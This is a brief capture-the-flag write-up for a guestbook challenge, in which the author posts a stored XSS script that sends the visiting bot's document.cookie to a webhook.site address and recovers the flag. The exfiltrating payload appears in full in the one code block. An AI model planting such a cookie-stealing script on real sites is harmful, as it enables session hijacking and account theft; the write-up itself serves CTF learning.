# 1 - My GuestBook 

Let's go:

![ctf](https://github.com/xProsek720/MSHP_CTF_2023_WriteUp/blob/main/media/1/1.png)

First I saw that page:

![ctf](https://github.com/xProsek720/MSHP_CTF_2023_WriteUp/blob/main/media/1/2.png)

So I did write that js xss cookie stealer:

```
</u>
<script>
	fetch('https://webhook.site/591c#$@#-#$@#-#$%^-#$%^-!@#$366d@#$@/cockie',
  {method:'POST', mode:'no-cors', body: document.cookie});
</script>
```

and I did post it in the comments section... then waited for an full hour 

and did get a flag:

![ctf](https://github.com/xProsek720/MSHP_CTF_2023_WriteUp/blob/main/media/1/3.png)

It was just url encoded so I did report that flag to the bot:

![ctf](https://github.com/xProsek720/MSHP_CTF_2023_WriteUp/blob/main/media/1/4.png)
